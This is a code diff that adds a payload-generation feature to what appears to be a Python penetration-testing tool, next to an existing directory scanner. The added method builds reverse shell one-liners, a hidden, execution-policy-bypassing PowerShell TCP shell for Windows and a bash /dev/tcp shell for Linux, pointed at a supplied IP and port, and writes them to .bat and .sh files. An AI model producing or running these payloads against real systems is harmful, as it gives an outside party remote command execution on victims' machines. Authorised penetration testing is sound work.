@@ -179,6 +179,35 @@ class Action:
             self.log(file_name, content)
         return return_value
 
+    def create_payload(self, ip: str, port: str, target_os: str, logging: bool) -> int:
+        """
+        This Method creates a payload for a reverse shell.
+        """
+        return_value = 0
+        payload = ""
+        print(colored("INFO: Creating payload ...", "blue"))
+        if target_os == "windows":
+            payload = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$s=$client.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$client.Close()'
+        elif target_os == "linux":
+            payload = f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
+        else:
+            functions.quit("FAILURE: Invalid target OS.")
+        print(colored("SUCCESS: Payload created.", "green"))
+        print(colored("INFO: Finished creating payload.", "blue"))
+        if logging:
+            file_name = "result_cp_" + ip + "_" + port
+            content = str("Payload written to Payload File is: \n" + payload)
+            if not os.path.isdir("../payloads"):
+                os.mkdir("../payloads")
+            if target_os == "windows":
+                with open("../payloads/payload_" + ip + port + ".bat", "w") as f:
+                    f.write(payload)
+            elif target_os == "linux":
+                with open("../payloads/payload_" + file_name + ".sh", "w") as f:
+                    f.write(payload)
+            self.log(file_name, content)
+        return return_value
+
     def perform(self) -> int:
         """
         Performs the action.
@@ -193,5 +222,8 @@ class Action:
         elif self.__action == "ds":
             # Instructions for when the user wants to scan directories
             status = self.scan_directories(ip=self.args[0], wordlist=self.args[1], logging=is_log)
+        elif self.__action == "cp":
+            # Instructions for when the user wants to create a payload
+            status = self.create_payload(ip=self.args[0], port=self.args[1], target_os=self.args[2], logging=is_log)
 
         return status
